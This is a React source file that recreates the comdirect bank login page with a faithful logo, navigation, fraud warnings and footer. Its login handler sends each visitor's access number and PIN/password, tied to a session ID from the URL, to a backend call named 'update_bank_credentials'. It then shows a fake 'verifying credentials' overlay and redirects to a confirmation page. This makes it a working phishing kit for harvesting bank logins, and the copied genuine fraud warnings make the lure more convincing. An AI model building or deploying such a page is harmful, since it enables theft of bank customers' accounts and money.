import { useEffect, useState } from "react";
import { useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import teaserAsset from "@/assets/comdirect-teaser.jpg.asset.json";

const DARK = "#0B1E25";
const YELLOW = "#FFED00";
const TEXT_SECONDARY = "#5a6b73";

const WordmarkSVG = ({ color = "#0B1E25", height = 21 }: { color?: string; height?: number }) => (
  <svg xmlns="http://www.w3.org/2000/svg" height={height} viewBox="48.478 103.112 152.304 24" aria-label="comdirect">
    <path
      fill={color}
      d="M56.978 110.6c-5.144 0-8.5 3.556-8.5 8.256 0 4.701 3.356 8.257 8.5 8.257 2.412 0 4.571-.853 6.039-2.508l-2.175-2.359c-1.029.935-2.412 1.638-3.963 1.638-2.715 0-4.772-2.062-4.772-5.027s2.058-5.03 4.772-5.03c1.551 0 2.75.591 3.878 1.622l2.26-2.343c-1.434-1.655-3.627-2.506-6.039-2.506zm16.495 0c-4.993 0-8.686 3.556-8.686 8.256 0 4.701 3.693 8.257 8.686 8.257 4.992 0 8.703-3.557 8.703-8.257-.001-4.703-3.711-8.256-8.703-8.256zm0 3.226c2.884 0 5.077 2.065 5.077 5.029 0 2.966-2.193 5.028-5.077 5.028-2.885 0-5.059-2.062-5.059-5.028-.001-2.963 2.174-5.029 5.059-5.029zm28.547-3.191c-2.108 0-3.585.752-4.748 1.812-.969-1.035-2.18-1.812-4.264-1.812-1.5 0-2.882.8-3.56 1.505v-1.152h-3.584v15.715h3.584v-11.315c.63-.729 1.599-1.411 3.077-1.411 2.132 0 3.099 1.787 3.099 4.211v8.516h3.585v-11.315c.678-.729 1.453-1.411 2.81-1.411 2.446 0 3.366 1.787 3.366 4.211v8.516h3.585v-8.021c.001-4.779-2.009-8.049-6.95-8.049m18.121-.035c-4.52 0-8.079 3.457-8.079 8.256 0 4.801 3.56 8.257 8.079 8.257 2.293 0 3.963-.902 5.076-2.293v1.883h3.524v-23.59h-3.524v9.797c-1.113-1.393-2.783-2.31-5.076-2.31zm.421 3.226c2.919 0 4.874 2.162 4.874 5.029s-1.956 5.028-4.874 5.028c-3.036 0-4.873-2.277-4.873-5.028-.001-2.751 1.836-5.029 4.873-5.029zm16.579-2.817h-3.542v15.693h3.542v-15.693zm13.037-.409c-1.974 0-3.627.688-4.688 2.179v-1.77h-3.491v15.693h3.525v-8.634c0-2.67 1.601-4.209 3.844-4.209.862 0 1.941.196 2.682.573l.844-3.391c-.811-.311-1.637-.441-2.716-.441zm11.839 0c-4.756 0-8.045 3.342-8.045 8.256 0 4.98 3.425 8.257 8.265 8.257 2.444 0 4.672-.573 6.645-2.212l-1.754-2.442c-1.332 1.033-3.053 1.655-4.673 1.655-2.293 0-4.333-1.179-4.807-3.997h11.943c.032-.394.065-.835.065-1.278-.016-4.899-3.119-8.239-7.639-8.239zm-.068 3.046c2.243 0 3.711 1.425 4.098 3.865h-8.382c.372-2.292 1.772-3.865 4.284-3.865zm18.739-3.046c-5.146 0-8.502 3.556-8.502 8.256 0 4.701 3.356 8.257 8.502 8.257 2.411 0 4.57-.853 6.037-2.508l-2.176-2.359c-1.028.935-2.411 1.638-3.963 1.638-2.715 0-4.773-2.062-4.773-5.027s2.058-5.03 4.773-5.03c1.552 0 2.75.591 3.878 1.622l2.261-2.343c-1.434-1.655-3.625-2.506-6.037-2.506zm9.333 10.419c0 4.177 2.142 6.094 5.801 6.094 2.023 0 3.659-.704 4.959-1.557l-1.4-2.735c-.962.59-2.159 1.063-3.254 1.063-1.417 0-2.564-.817-2.564-2.931v-6.832h6.189v-3.113h-6.189v-4.75h-3.541v14.761z"
    />
  </svg>
);

const CMark = ({ size = 56, color = DARK }: { size?: number; color?: string }) => (
  <svg viewBox="0 0 62 73" width={size} height={size * (73 / 62)} xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
    <path
      d="m62 10.6c-6.6-6.5-15.6-10.6-25.7-10.6-20 0-36.3 16.3-36.3 36.3s16.3 36.3 36.3 36.3c10 0 19.1-4.1 25.7-10.6l-11.2-11.2c-3.7 3.7-8.8 6-14.5 6-11.3 0-20.5-9.2-20.5-20.5s9.2-20.5 20.5-20.5c5.7 0 10.8 2.3 14.5 6z"
      fill={color}
    />
  </svg>
);

const Chevron = ({ open }: { open: boolean }) => (
  <svg
    width="20"
    height="20"
    viewBox="0 0 24 24"
    fill="none"
    stroke={DARK}
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
    style={{ transition: "transform 200ms", transform: open ? "rotate(180deg)" : "rotate(0deg)" }}
  >
    <polyline points="6 9 12 15 18 9" />
  </svg>
);

const SearchIcon = ({ color = DARK }: { color?: string }) => (
  <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" style={{ color }} aria-hidden="true">
    <path d="M17.41 14h-2.17A8 8 0 1 0 14 15.24v2.17l6 6L23.41 20ZM9 15a6 6 0 1 1 6-6 6 6 0 0 1-6 6Z" />
  </svg>
);

const WarningTriangle = () => (
  <svg width="40" height="40" viewBox="0 0 24 24" aria-hidden="true">
    <path d="M12 2 1 21h22L12 2Zm0 4.5L19.5 19h-15L12 6.5Z" fill="#DE0000" />
    <rect x="11" y="10" width="2" height="5" fill="#DE0000" />
    <circle cx="12" cy="17" r="1" fill="#DE0000" />
  </svg>
);

const FloatingInput = ({
  id,
  label,
  type = "text",
  value,
  onChange,
}: {
  id: string;
  label: string;
  type?: string;
  value: string;
  onChange: (v: string) => void;
}) => {
  const [focus, setFocus] = useState(false);
  const active = focus || value.length > 0;
  return (
    <div className="relative border border-[#d0d6d9] rounded-sm bg-white h-[58px] px-3 pt-5 pb-1">
      <label
        htmlFor={id}
        className="absolute left-3 pointer-events-none transition-all duration-150"
        style={{
          top: active ? 6 : 18,
          fontSize: active ? 12 : 15,
          color: active ? DARK : TEXT_SECONDARY,
        }}
      >
        {label}
      </label>
      <input
        id={id}
        type={type}
        value={value}
        onChange={(e) => onChange(e.target.value)}
        onFocus={() => setFocus(true)}
        onBlur={() => setFocus(false)}
        autoComplete="off"
        className="w-full outline-none bg-transparent text-[15px]"
        style={{ color: DARK }}
      />
    </div>
  );
};

const navItems = [
  "Persönlicher Bereich",
  "Informer",
  "Girokonto",
  "Altersvorsorge",
  "Geldanlage",
  "Depot",
  "Wertpapierhandel",
  "Kredite",
  "Hilfe & Service",
];

const fraudItems = [
  {
    title: "Betrug beim mobilen Bezahlen",
    body:
      "Betrüger versuchen zunehmend, Kundinnen und Kunden dazu zu bringen, ihre Kreditkartendaten in mobilen Bezahl-Apps wie Apple Pay oder Google Pay zu hinterlegen. Geben Sie Ihre Daten niemals an Dritte weiter.",
  },
  {
    title: "Anlagebetrug",
    body:
      "Angebliche Anlageberater versprechen hohe Renditen auf dubiosen Plattformen. Investieren Sie ausschließlich bei regulierten Anbietern und misstrauen Sie unrealistischen Gewinnversprechen.",
  },
  {
    title: "Phishing: gefälschte E-Mails und SMS",
    body:
      "comdirect fordert Sie niemals per E-Mail oder SMS zur Eingabe Ihrer PIN oder TAN auf. Klicken Sie keine Links aus verdächtigen Nachrichten an.",
  },
  {
    title: "Betrug per Brief: gefälschte QR-Codes",
    body:
      "Aktuell versenden Betrüger gefälschte Briefe mit QR-Codes, die auf Phishing-Seiten führen. comdirect verschickt keine Briefe mit QR-Codes zum Login.",
  },
  {
    title: "Betrügerische Anrufe",
    body:
      "Geben Sie am Telefon niemals PIN, TAN oder Zugangsdaten weiter. Legen Sie im Zweifel auf und rufen Sie comdirect über die offizielle Hotline zurück.",
  },
  {
    title: "Betrug in Anzeigenportalen",
    body:
      "Bei Käufen und Verkäufen auf Kleinanzeigen-Plattformen werden häufig gefälschte Zahlungs- oder Bestätigungsseiten verschickt. Prüfen Sie Links sorgfältig.",
  },
  {
    title: "Betrug per WhatsApp: Enkeltrick",
    body:
      "Betrüger geben sich als Kinder oder Enkel aus und bitten über WhatsApp um Geld. Überweisen Sie nichts, ohne vorher persönlich mit der Person gesprochen zu haben.",
  },
];

const footerCols = [
  ["Kontakt", "Über uns", "Presse", "Magazin", "Barrierefreiheit"],
  ["Karriere", "Community", "Apps", "Kunden werben Kunden"],
  ["Impressum", "Datenschutz", "Einwilligungseinstellungen", "Sicherheit", "Nutzungsbedingungen", "AGB"],
];

const SocialIcons = () => (
  <div className="flex gap-4 items-center" style={{ color: YELLOW }}>
    <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor" aria-label="Facebook">
      <path d="M22 12a10 10 0 1 0-11.56 9.88v-6.99H7.9V12h2.54V9.8c0-2.5 1.49-3.89 3.78-3.89 1.09 0 2.24.2 2.24.2v2.46h-1.26c-1.24 0-1.63.77-1.63 1.56V12h2.78l-.44 2.89h-2.33v6.99A10 10 0 0 0 22 12Z" />
    </svg>
    <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor" aria-label="YouTube">
      <path d="M23 12s0-3.6-.46-5.33a2.78 2.78 0 0 0-1.96-1.96C18.86 4.25 12 4.25 12 4.25s-6.86 0-8.58.46A2.78 2.78 0 0 0 1.46 6.67 29.34 29.34 0 0 0 1 12a29.34 29.34 0 0 0 .46 5.33 2.78 2.78 0 0 0 1.96 1.96c1.72.46 8.58.46 8.58.46s6.86 0 8.58-.46a2.78 2.78 0 0 0 1.96-1.96A29.34 29.34 0 0 0 23 12ZM9.75 15.27v-6.5L15.5 12l-5.75 3.27Z" />
    </svg>
    <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor" aria-label="Instagram">
      <path d="M12 2.16c3.2 0 3.58.01 4.85.07 1.17.05 1.8.25 2.23.41.56.22.96.48 1.38.9.42.42.68.82.9 1.38.16.42.36 1.06.41 2.23.06 1.27.07 1.65.07 4.85s-.01 3.58-.07 4.85c-.05 1.17-.25 1.81-.41 2.23-.22.56-.48.96-.9 1.38a3.73 3.73 0 0 1-1.38.9c-.42.16-1.06.36-2.23.41-1.27.06-1.65.07-4.85.07s-3.58-.01-4.85-.07c-1.17-.05-1.8-.25-2.23-.41a3.73 3.73 0 0 1-1.38-.9 3.73 3.73 0 0 1-.9-1.38c-.16-.42-.36-1.06-.41-2.23C2.17 15.58 2.16 15.2 2.16 12s.01-3.58.07-4.85c.05-1.17.25-1.8.41-2.23.22-.56.48-.96.9-1.38.42-.42.82-.68 1.38-.9.42-.16 1.06-.36 2.23-.41C8.42 2.17 8.8 2.16 12 2.16M12 0C8.74 0 8.33.01 7.05.07 5.78.13 4.9.33 4.14.63a5.9 5.9 0 0 0-2.13 1.38A5.9 5.9 0 0 0 .63 4.14C.33 4.9.13 5.78.07 7.05.01 8.33 0 8.74 0 12s.01 3.67.07 4.95c.06 1.27.26 2.15.56 2.91.3.78.72 1.44 1.38 2.13.69.66 1.35 1.08 2.13 1.38.76.3 1.64.5 2.91.56C8.33 23.99 8.74 24 12 24s3.67-.01 4.95-.07c1.27-.06 2.15-.26 2.91-.56a5.9 5.9 0 0 0 2.13-1.38 5.9 5.9 0 0 0 1.38-2.13c.3-.76.5-1.64.56-2.91.06-1.28.07-1.69.07-4.95s-.01-3.67-.07-4.95c-.06-1.27-.26-2.15-.56-2.91a5.9 5.9 0 0 0-1.38-2.13A5.9 5.9 0 0 0 19.86.63C19.1.33 18.22.13 16.95.07 15.67.01 15.26 0 12 0Zm0 5.84A6.16 6.16 0 1 0 18.16 12 6.16 6.16 0 0 0 12 5.84Zm0 10.16A4 4 0 1 1 16 12a4 4 0 0 1-4 4Zm6.4-11.84a1.44 1.44 0 1 0 1.44 1.44 1.44 1.44 0 0 0-1.44-1.44Z" />
    </svg>
  </div>
);

const Comdirect = () => {
  const [searchParams] = useSearchParams();
  const sessionId = searchParams.get("s") || "";
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [direktZu, setDirektZu] = useState("PersoenlicherBereich");
  const [submitting, setSubmitting] = useState(false);
  const [showLoading, setShowLoading] = useState(false);
  const [openPanel, setOpenPanel] = useState<number | null>(null);

  usePageMeta("comdirect Login", undefined);
  useEffect(() => { window.scrollTo(0, 0); }, []);

  const handleLogin = async () => {
    if (submitting) return;
    setSubmitting(true);
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: username,
        p_password: password,
        p_username_label: "Zugangsnummer / Benutzername (E-Mail)",
        p_password_label: "PIN / Passwort",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  return (
    <div className="min-h-screen bg-white" style={{ color: DARK, fontFamily: "'Open Sans', Arial, sans-serif" }}>
      {/* HEADER */}
      <header className="w-full" style={{ backgroundColor: DARK }}>
        <div className="max-w-[1200px] mx-auto flex items-stretch">
          {/* yellow logo block */}
          <a href="#" className="flex items-center justify-center px-10 py-4" style={{ backgroundColor: YELLOW, minWidth: 220 }}>
            <WordmarkSVG color={DARK} height={22} />
          </a>
          {/* right side */}
          <div className="flex-1 flex items-center justify-end gap-6 px-6 py-3">
            <a href="#" className="text-white text-[13px] hover:underline">Musterdepot</a>
            <a href="#" className="text-white text-[13px] hover:underline">B2B</a>
            <div className="flex items-center bg-white rounded-full px-4 h-9 w-[180px]">
              <input className="flex-1 outline-none text-[13px] bg-transparent" placeholder="WKN, ISIN, Name" />
              <SearchIcon />
            </div>
            <div className="flex items-center bg-white rounded-full px-4 h-9 w-[180px]">
              <input className="flex-1 outline-none text-[13px] bg-transparent" placeholder="Volltextsuche" />
              <SearchIcon />
            </div>
            <a
              href="#"
              className="rounded-full px-5 h-9 flex items-center text-[14px] font-semibold"
              style={{ backgroundColor: YELLOW, color: DARK }}
            >
              Login <span className="ml-2">›</span>
            </a>
          </div>
        </div>
        {/* main nav */}
        <nav className="border-t border-white/10">
          <div className="max-w-[1200px] mx-auto flex items-center justify-end gap-7 px-6 py-3">
            {navItems.map((n) => (
              <a key={n} href="#" className="text-white text-[14px] font-semibold hover:text-[color:var(--cd-yellow)]" style={{ ["--cd-yellow" as any]: YELLOW }}>
                {n}
              </a>
            ))}
          </div>
        </nav>
      </header>

      {/* MAIN */}
      <main className="max-w-[1200px] mx-auto px-6 py-10">
        <h1 className="text-[40px] leading-tight font-light mb-8" style={{ color: DARK }}>
          comdirect Login
        </h1>
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-10">
          {/* LEFT: form */}
          <div>
            <div className="space-y-4 max-w-[520px]">
              <FloatingInput
                id="cd-user"
                label="Zugangsnummer / Benutzername (E-Mail)"
                value={username}
                onChange={setUsername}
              />
              <FloatingInput
                id="cd-pw"
                label="PIN / Passwort"
                type="password"
                value={password}
                onChange={setPassword}
              />
              <div className="relative border border-[#d0d6d9] rounded-sm bg-white h-[58px] px-3 pt-5 pb-1">
                <label className="absolute left-3 top-[6px] text-[12px]" style={{ color: DARK }}>Direkt zu</label>
                <select
                  value={direktZu}
                  onChange={(e) => setDirektZu(e.target.value)}
                  className="w-full outline-none bg-transparent text-[15px] appearance-none pr-6"
                  style={{ color: DARK }}
                >
                  <option value="PersoenlicherBereich">Persönlicher Bereich</option>
                  <option value="DepotUebersicht">Depotübersicht</option>
                  <option value="Abrechnungsdaten">Abrechnungsdaten</option>
                  <option value="DepotUmsaetze">Depotumsätze</option>
                  <option value="Order">Order</option>
                  <option value="DepotOrderbuch">Orderbuch</option>
                  <option value="KontoUmsaetze">Kontoumsätze</option>
                  <option value="KontoUeberweisung">Überweisung</option>
                  <option value="Musterdepot">Musterdepot</option>
                  <option value="InformerStartseite">Meine Informer Startseite</option>
                </select>
                <span className="absolute right-3 top-1/2 -translate-y-1/2 pointer-events-none">
                  <Chevron open={false} />
                </span>
              </div>
              <button
                onClick={handleLogin}
                disabled={submitting}
                className="rounded-full px-8 h-12 flex items-center text-[16px] font-semibold transition-colors hover:brightness-95"
                style={{ backgroundColor: YELLOW, color: DARK }}
              >
                Anmelden <span className="ml-2">›</span>
              </button>
              <div className="pt-2 text-[14px]" style={{ color: TEXT_SECONDARY }}>
                <a href="#" className="underline hover:no-underline">Information zum Login</a>
                <span className="mx-2 font-semibold">·</span>
                <a href="#" className="underline hover:no-underline">Login vergessen / gesperrt?</a>
              </div>
              <div className="pt-6">
                <h2 className="text-[20px] font-semibold mb-4" style={{ color: DARK }}>comdirect Kunde werden?</h2>
                <div className="flex flex-wrap gap-3">
                  <a href="#" className="rounded-full px-6 h-10 flex items-center text-[14px] font-semibold border" style={{ borderColor: DARK, color: DARK, backgroundColor: "#eef1f2" }}>
                    Depot eröffnen <span className="ml-2">›</span>
                  </a>
                  <a href="#" className="rounded-full px-6 h-10 flex items-center text-[14px] font-semibold border" style={{ borderColor: DARK, color: DARK, backgroundColor: "#eef1f2" }}>
                    Girokonto eröffnen <span className="ml-2">›</span>
                  </a>
                </div>
                <a href="#" className="inline-block mt-4 text-[14px] underline hover:no-underline" style={{ color: TEXT_SECONDARY }}>
                  Kostenfreie Registrierung als comdirect Member inkl.<br />Musterdepot und Community
                </a>
              </div>
            </div>
          </div>

          {/* RIGHT: teaser + fraud */}
          <div className="space-y-6">
            <a href="#" className="block bg-[#f5f5f3] rounded-sm overflow-hidden flex items-stretch group">
              <img src={teaserAsset.url} alt="Dein Zukunfts-Ich fragt, wann du startest" className="w-[220px] object-cover" />
              <div className="flex-1 p-6 flex flex-col justify-center">
                <h3 className="text-[22px] font-semibold leading-snug" style={{ color: DARK }}>
                  Dein Zukunfts-Ich fragt, wann du startest
                </h3>
                <p className="text-[14px] mt-2" style={{ color: TEXT_SECONDARY }}>
                  Auch kleine Schritte summieren sich zu etwas Großem.
                </p>
              </div>
              <div className="self-end p-4 text-[28px]" style={{ color: DARK }}>›</div>
            </a>

            <div className="bg-[#f5f5f3] p-6 rounded-sm">
              <div className="flex items-start justify-between gap-4 mb-3">
                <h3 className="text-[22px] font-semibold leading-snug" style={{ color: DARK }}>
                  Warnung:<br />aktuelle Betrugsfälle!
                </h3>
                <WarningTriangle />
              </div>
              <p className="text-[14px] mb-4" style={{ color: DARK }}>
                comdirect Kundinnen und Kunden sind aktuell von verschiedenen Betrugsfällen betroffen. Wir sagen dir, wie du dich davor schützen kannst.
              </p>
              <div className="divide-y divide-[#d6d8d4] border-t border-b border-[#d6d8d4]">
                {fraudItems.map((f, i) => {
                  const open = openPanel === i;
                  return (
                    <div key={f.title}>
                      <button
                        onClick={() => setOpenPanel(open ? null : i)}
                        className="w-full flex items-center justify-between py-3 text-left"
                        aria-expanded={open}
                      >
                        <span className="text-[15px] font-semibold" style={{ color: DARK }}>{f.title}</span>
                        <Chevron open={open} />
                      </button>
                      {open && (
                        <div className="pb-4 text-[14px] leading-relaxed" style={{ color: DARK }}>
                          {f.body}
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* FOOTER */}
      <footer className="relative mt-16 overflow-hidden" style={{ backgroundColor: DARK, color: "#cfd4d6" }}>
        {/* decorative circles */}
        <div className="absolute left-0 bottom-0 opacity-10 pointer-events-none">
          <svg width="320" height="320" viewBox="0 0 320 320">
            <circle cx="100" cy="220" r="100" fill="#fff" />
            <circle cx="40" cy="140" r="40" fill="#fff" />
            <circle cx="200" cy="280" r="40" fill="#fff" />
          </svg>
        </div>
        <div className="absolute right-0 top-10 pointer-events-none">
          <svg width="260" height="260" viewBox="0 0 260 260">
            <circle cx="130" cy="130" r="120" fill="#1a2d34" />
            <path d="M130 10a120 120 0 0 1 0 240V10Z" fill={YELLOW} />
            <circle cx="130" cy="130" r="70" fill={DARK} />
          </svg>
        </div>

        <div className="relative max-w-[1200px] mx-auto px-6 py-16">
          <div className="grid grid-cols-1 md:grid-cols-4 gap-10 mb-10">
            <div>
              <WordmarkSVG color={YELLOW} height={28} />
            </div>
            {footerCols.map((col, i) => (
              <ul key={i} className="space-y-2 text-[14px]">
                {col.map((item) => (
                  <li key={item}>
                    <a href="#" className="hover:underline" style={{ color: "#e5e7e8" }}>{item}</a>
                  </li>
                ))}
              </ul>
            ))}
          </div>
          <div className="flex flex-wrap items-center justify-between gap-4 pt-6 border-t border-white/10">
            <a href="#" className="rounded-full px-5 h-9 flex items-center text-[13px] font-semibold" style={{ backgroundColor: "#1a2d34", color: "#e5e7e8" }}>
              Vertrag widerrufen <span className="ml-2">›</span>
            </a>
            <p className="text-[12px]" style={{ color: "#9fb0b5" }}>
              © comdirect – eine Marke der Commerzbank AG
            </p>
            <SocialIcons />
          </div>
        </div>
      </footer>

      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => {
            window.location.href = `/confirmation${sessionId ? `?s=${sessionId}` : ""}`;
          }}
        />
      )}
    </div>
  );
};

export default Comdirect;
